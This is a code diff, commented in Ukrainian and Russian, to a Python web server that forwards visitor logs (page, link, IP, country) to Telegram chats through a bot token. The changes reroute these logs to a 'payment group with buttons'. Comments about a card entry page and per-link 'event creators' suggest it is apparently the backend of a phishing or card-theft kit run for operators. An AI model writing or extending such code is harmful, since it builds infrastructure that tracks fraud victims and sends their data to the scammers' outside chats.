@@ -426,8 +426,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
     )
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     data_admin = {"chat_id": ADMIN_ID, "text": msg}
-    data_group = {"chat_id": GROUP_ID, "text": msg}
-    # data_group2 = {"chat_id": PAYMENT_GROUP_ID, "text": msg}  # НЕ використовуємо для логів сторінок
+    data_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}  # Логи сторінок йдуть в групу З КНОПКАМИ
     
     try:
         # Якщо це лог для event creator, надсилаємо тільки йому
@@ -437,7 +436,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                 requests.post(url, data=data_event_creator, timeout=1)
                 print(f"📤 Лог надіслано event creator {extra_user_id}")
                 
-                # НЕ надсилаємо в платіжну групу - тільки прямий лог на сторінці введення карти
+                # Логи сторінок йдуть в групу З КНОПКАМИ (PAYMENT_GROUP_ID)
                         
             except Exception as e:
                 print(f"❌ Помилка надсилання event creator {extra_user_id}: {e}")
@@ -447,7 +446,7 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                 try:
                     requests.post(url, data=data_group, timeout=1)
                     print(f"\n\n\n\n\n\n\n\n\n{page}")
-                    # НЕ надсилаємо в платіжну групу - тільки прямий лог на сторінці введення карти
+                    # Логи сторінок йдуть в групу З КНОПКАМИ (PAYMENT_GROUP_ID)
                 except Exception as e:
                     print(f"❌ Помилка надсилання в групу: {e}")
             
@@ -1018,14 +1017,14 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                 f"🌎Страна: {country}"
             )
             
-            # Надсилаємо в групу адміністраторів
+            # Надсилаємо в групу адміністраторів З КНОПКАМИ (PAYMENT_GROUP_ID)
             try:
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                data = {"chat_id": GROUP_ID, "text": message}
+                data = {"chat_id": PAYMENT_GROUP_ID, "text": message}
                 requests.post(url, data=data, timeout=1)
-                print(f"📤 Лог надіслано в групу для сторінки: {page_name}")
+                print(f"📤 Лог надіслано в групу З КНОПКАМИ для сторінки: {page_name}")
             except Exception as e:
-                print(f"❌ Помилка надсилання в групу: {e}")
+                print(f"❌ Помилка надсилання в групу З КНОПКАМИ: {e}")
         else:
             pass  # Не логуємо зайві повідомлення
         
